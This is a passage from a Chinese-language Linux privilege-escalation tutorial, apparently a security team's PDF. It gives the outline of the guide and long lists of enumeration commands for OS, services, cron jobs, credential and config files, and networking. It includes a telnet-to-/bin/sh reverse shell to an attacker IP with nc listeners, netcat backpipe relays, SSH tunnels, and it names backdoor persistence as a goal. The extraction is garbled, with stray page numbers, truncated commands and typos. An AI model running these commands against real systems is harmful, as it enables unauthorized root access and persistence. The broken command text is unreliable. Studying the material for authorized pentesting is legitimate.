目录
前言
2
1-linux提权描述
4
2-基本Linux权限提升前的信息收集
6
3-linux提权—自动信息收集
18
4-linux提权-内核漏洞提权
19
5-1-linux-历史漏洞提权
24
5-linux提权-利用以root权限运行的服务
25
6-Linux提权-NFS权限弱
27
7-linux提权-Suid和Guid配置错误
32
8-linux提权—滥用SUDO
41
9-linux提权-利用“.”路径配置错误
45
10-linux提权—利用定时任务（Cron jobs）
47
11-linux提权-通配符注入
54
渗透测试 红队攻防 免杀 权限维持 等等技术 
及时分享最新漏洞复现以及EXP 国内外最新技术分享!!!
进来一起学习吧
本文由黑白天安全团队李木整理
水平有限，错误还望大佬多多包涵！！
仅供学习研究，请遵守法律不要进行非法攻击！
微信扫一扫关注公众号
大多数计算机系统设计为可与多个用户一起使用。特权是指允许用户执行
的操作。普通特权包括查看和编辑文件或修改系统文件。特权升级意味着
用户获得他们无权获得的特权。这些特权可用于删除文件，查看私人信息
或安装不需要的程序，例如病毒。通常，当系统存在允许绕过安全性的错
误或对使用方法的设计假设存在缺陷时，通常会发生这种情况。
特权提升是利用操作系统或软件应用程序中的错误，设计缺陷等等来获得
对通常受到应用程序或用户保护的资源的更高访问权限的行为。结果是，
具有比应用程序开发人员或系统管理员想要的特权更多的应用程序可以执
行未经授权的操作。
特权升级有两种类型：水平和垂直。在水平升级中，您从一个用户转移到
另一个用户。在这种情况下，两个用户都是通用的，而在垂直方式中，我
们将特权从普通用户提升为管理员
简单来说就是
即用户无法访问（读取/写入/执行）不允许访问的文件。但是，超级用户
（root）可以访问系统上存在的所有文件。 为了更改任何重要的配置或进
行进一步的攻击，首先，我们需要在任何基于Linux的系统上获得root用户
访问权限
为什么我们需要执行特权升级？
读/写任何敏感文件
重新启动之间轻松保持
插入永久后门
特权升级所使用的技术
我们假设现在我们在远程系统上有外壳。根据我们渗透进去的方式，我们
可能没有“ root”特权。以下提到的技术可用于获取系统上的“ root”访问权
限。
内核漏洞
以root身份运行的程序
已安装的软件
弱密码/重用密码/纯文本密码
内部服务
Suid配置错误
滥用sudo权利
由root调用的可写脚本
路径配置错误
Cronjobs
卸载的文件系统
信息收集是关键。
（Linux）特权提升的TIps：
信息信息，更多的信息收集，信息收集是整个渗透测试过程的
整理信息，分析收集的信息和整理信息。
搜索漏洞- 知道要搜索什么以及在哪里可以找到漏洞利用代码。
修改代码- 修改漏洞利用程序，使其适合目前的渗透。并非每种漏洞都能
为“现成”的每个系统工作。漏洞看环境
尝试攻击- 为（很多）尝试和错误做好准备。
操作系统
什么是发行类型？什么版本的？
什么是内核版本？是64位吗？
从环境变量中可以收集到什么信息？环境变量中可能存在密码或API密钥
cat /etc/issue 
cat /etc/*-release 
cat /etc/lsb-release # Debian based 
cat /etc/redhat-release # Redhat based
cat /proc/version 
uname -a uname -mrs 
rpm -q kernel 
dmesg | grep Linux 
ls /boot | grep vmlinuz-
cat /etc/profile 
cat /etc/bashrc 
1
2
3
4
1
2
3
4
5
1
2
路径（Path)
如果您对该变量内的任何文件夹都具有写权限，则可以劫持某些库或二进制
文件：PATH
echo $ PATH 
有打印机吗？
应用与服务
哪些服务正在运行？哪个服务具有哪个用户特权？
root正在运行哪些服务？在这些易受攻击的服务中，值得仔细检查！
安装了哪些应用程序？他们是什么版本的？他们目前在运行吗？
cat ~/.bash_profile 
cat ~/.bashrc 
cat ~/.bash_logout 
env set
lpstat -a
ps aux 
ps -ef top 
cat /etc/services
ps aux | grep root ps -ef | grep root
ls -alh /usr/bin/ 
ls -alh /sbin/ 
dpkg -l 
3
4
5
6
1
1
2
3
1
1
2
3
服务设置是否配置错误？是否附有（脆弱的）插件？
计划了哪些工作？（计划任务）
是否有纯文本用户名和/或密码？
检查Web服务器连接到数据库的文件（config.php或类似文件）
检查数据库以获取可能被重用的管理员密码
rpm -qa 
ls -alh /var/cache/apt/archivesO 
ls -alh /var/cache/yum/
cat /etc/syslog.conf 
cat /etc/chttp.conf 
cat /etc/lighttpd.conf 
cat /etc/cups/cupsd.conf 
cat /etc/inetd.conf 
cat /etc/apache2/apache2.conf 
cat /etc/my.conf 
cat /etc/httpd/conf/httpd.conf 
cat /opt/lampp/etc/httpd.conf 
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
crontab -l 
ls -alh /var/spool/cron 
ls -al /etc/ | grep cron 
ls -al /etc/cron* 
cat /etc/cron*
cat /etc/at.allow 
cat /etc/at.deny 
cat /etc/cron.allow 
cat /etc/cron.deny 
cat /etc/crontab 
cat /etc/anacrontab 
cat /var/spool/cron/crontabs/root
4
5
6
1
2
3
4
5
6
7
8
9
10
1
2
3
4
5
6
7
8
9
10
11
12
检查弱密码
通讯与网络
系统具有哪些NIC？它是否连接到另一个网络？
什么是网络配置设置？我们可以找到关于该网络的哪些信息？DHCP服务
器？DNS服务器？网关？
其他哪些用户和主机正在与系统通信？
在这种情况下，用户正在运行某些只能从该主机获得的服务。您无法从外部连接到服
务。它可能是开发服务器，数据库或其他任何东西。这些服务可能以root用户身份运行，
或者其中可能存在漏洞。由于开发人员或用户可能在考虑“由于只有特定用户可以访问
它，因此我们不需要花费那么多的安全性”，因此它们可能更加脆弱。
grep -i user [filename] 
grep -i pass [filename] 
grep -C 5 "password" [filename] 
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" # Joomla
/sbin/ifconfig -a 
cat /etc/network/interfaces 
cat /etc/sysconfig/network
cat /etc/resolv.conf 
cat /etc/sysconfig/network 
cat /etc/networks 
iptables -L 
hostname 
dnsdomainname
1
2
3
4
1
2
3
1
2
3
4
5
6
检查netstat并将其与您从外部进行的nmap扫描进行比较。您是否能从内部找到更多可用
的服务？
# Linux 
netstat -anlp 
netstat -ano
缓存了什么？IP和/或MAC地址
数据包嗅探是否可能？可以看到什么？
注意：tcpdump tcp dst [ip] [端口]和tcp dst [ip] [端口]
我们有shell吗？
lsof -i 
lsof -i :80 grep 80 /etc/services 
netstat -antup 
netstat -antpx 
netstat -tulpn 
chkconfig --list chkconfig --list | grep 3:on 
last 
w
arp -e 
route 
/sbin/route -nee
tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
nc -lvp 4444 # Attacker. Input (Commands) 
nc -lvp 4445 # Attacker. Ouput (Results) 
telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445 # On the targets syst
1
2
3
4
5
6
7
8
1
2
3
1
1
2
3
是否可以进行端口转发？重定向流量并与之交互
注意：FPipe.exe -l [本地端口] -r [远程端口] -s [本地端口] [本地IP]
注意：ssh-[L / R] [本地端口]：[远程IP]：[远程端口] [本地用户] @ [本地IP]
注意：mknod backpipe p; nc -l -p [远程端口]  backpipe
可以使用隧道吗？在本地远程发送命令
机密信息和用户
你是谁？谁登录？谁已经登录？那里还有谁？谁能做什么？
FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port 
ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port
mknod backpipe p ; nc -l -p 8080 backpipe # Po
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhos
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhos
ssh -D 127.0.0.1:9050 -N [username]@[ip] 
proxychains ifconfig
id
who 
w 
1
1
2
1
2
3
1